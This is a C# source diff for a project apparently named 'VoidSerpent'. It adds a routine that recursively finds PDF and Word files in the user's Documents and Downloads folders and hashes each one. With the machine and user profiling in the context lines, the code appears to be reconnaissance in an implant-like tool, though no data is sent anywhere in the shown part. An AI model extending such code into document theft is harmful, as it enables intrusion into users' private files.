@@ -1,8 +1,12 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.Diagnostics;
+using System.IO;
 using System.Linq;
 using System.Management;
+using System.Security.Cryptography;
 using System.Security.Principal;
+using System.Text;
 using System.Threading;
 
 namespace VoidSerpent
@@ -102,6 +106,77 @@ namespace VoidSerpent
             {
                 ComputerName = computerName;
                 UserName = userName;
+            }
+        }
+
+        public static List<(string Path, string Sha1Hash)> EnumerateFiles()
+        {
+            // Get the user's Documents and Downloads folders
+            string documentsPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+            string downloadsPath = System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads");
+
+            // Define the file extensions we're interested in
+            List<string> validExtensions = new List<string>
+        {
+            ".pdf",
+            ".doc",
+            ".docx"
+        };
+
+            // Create a list to store the results
+            List<(string Path, string Sha1Hash)> result = new List<(string Path, string Sha1Hash)>();
+
+            // Helper function to add files from a directory to the result list
+            void AddFilesFromDirectory(string directoryPath)
+            {
+                try
+                {
+                    foreach (string file in Directory.GetFiles(directoryPath))
+                    {
+                        var fileInfo = new FileInfo(file);
+                        if (validExtensions.Contains(fileInfo.Extension.ToLower()))
+                        {
+                            string sha1Hash = GetFileSha1Hash(file);
+                            result.Add((file, sha1Hash));
+                        }
+                    }
+
+                    // Recursively add files from subdirectories
+                    foreach (string subdir in Directory.GetDirectories(directoryPath))
+                    {
+                        AddFilesFromDirectory(subdir);
+                    }
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"Error processing directory {directoryPath}: {ex.Message}");
+                }
+            }
+
+            // Add files from the Documents folder
+            AddFilesFromDirectory(documentsPath);
+
+            // Add files from the Downloads folder
+            AddFilesFromDirectory(downloadsPath);
+
+            return result;
+        }
+
+        public static string GetFileSha1Hash(string filePath)
+        {
+            using (SHA1 sha1 = SHA1.Create())
+            {
+                byte[] fileBytes = File.ReadAllBytes(filePath);
+                byte[] hashBytes = sha1.ComputeHash(fileBytes);
+
+                // Convert the byte array to a hexadecimal string
+                StringBuilder builder = new StringBuilder();
+                for (int i = 0; i < hashBytes.Length; i++)
+                {
+                    builder.Append(hashBytes[i].ToString("x2"));
+                }
+
+                return builder.ToString();
             }
         }
     }
